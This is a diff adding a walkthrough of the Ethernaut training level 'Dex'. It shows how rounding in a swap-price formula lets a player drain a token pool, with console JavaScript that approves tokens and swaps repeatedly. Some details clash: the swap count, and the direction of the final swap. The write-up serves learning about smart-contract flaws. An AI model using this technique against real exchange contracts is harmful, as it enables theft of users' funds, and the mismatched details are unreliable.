@@ -53,6 +53,7 @@ yarn start -- <level_name>
  - [20. Alien Codex](#20-alien-codex)
  - [21. Denial](#21-denial)
  - [22. Shop](#22-shop)
+ - [23. Dex](#23-dex)
 
 ### 1. Hello Ethernaut
 
@@ -923,4 +924,70 @@ Then we just call the `buy()` function from the same contract and it should work
 function buy(address _shop) public {
     Sender(_shop).buy();
 }
+```
+
+---
+
+### 23. Dex
+
+In this level, we have a decentralized exchange contract that counts with `token1` and `token2`. The issue with this contract is that inside the `swap` function, the token price is calculated using the following function.
+
+```sol
+function getSwapPrice(address from, address to, uint amount) public view returns(uint){
+  return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
+}
+```
+
+The key is to recognize that the function returns a `uint` data type, which means that the returned value will be rounded. Now if we want to swap 10 tokens from `token1` to `token2` the formula would be as follows:
+
+```sol
+uint tokenPrice = 10 // (10 * 100) / 100 
+```
+
+Then we move the 20 tokens of `token2` to `token1` again
+
+```sol
+uint tokenPrice = 16 // (20 * 90) / 110 = 16.36 => 16.0
+```
+
+If we iterate and perform this operation many times, we will end up paying tokens for a very cheap price getting more and more tokens in our balance just swaping.
+
+Now let's start ensuring we have free manipulation approving our contract instance to swap 1000000000000000 tokens of each balance
+
+```js
+contract.approve(instance, 1000000000000000)
+```
+
+Declare the token addresses and some utility functions to make them easier to access
+
+```js
+const token1 = await contract.token1();
+const token2 = await contract.token2();
+const balance = contract.balanceOf;
+const swap = contract.swap;
+```
+
+Start swapping until it throws an error
+
+```js
+swap(token1, token2, await balance(token1, player));
+swap(token2, token1, await balance(token2, player));
+swap(token1, token2, await balance(token1, player));
+swap(token2, token1, await balance(token2, player));
+swap(token1, token2, await balance(token1, player));
+```
+
+After the 6th attempt, the contract reverted, which means that it does not contain enough supply to exchange our total balance, let's see our balances and the contract supply.
+
+```js
+await balance(token1, player).then(Number) // 0
+await balance(token2, player).then(Number) // 65 (consider that we started with 10 tokens of each one)
+await balance(token1, instance).then(Number) // 110
+await balance(token2, instance).then(Number) // 45
+```
+
+Finally, we just need to swap 45 `token1` to `token2` to leave the `token1` supply totally empty.
+
+```js
+swap(token2, token1, 45);
 ```
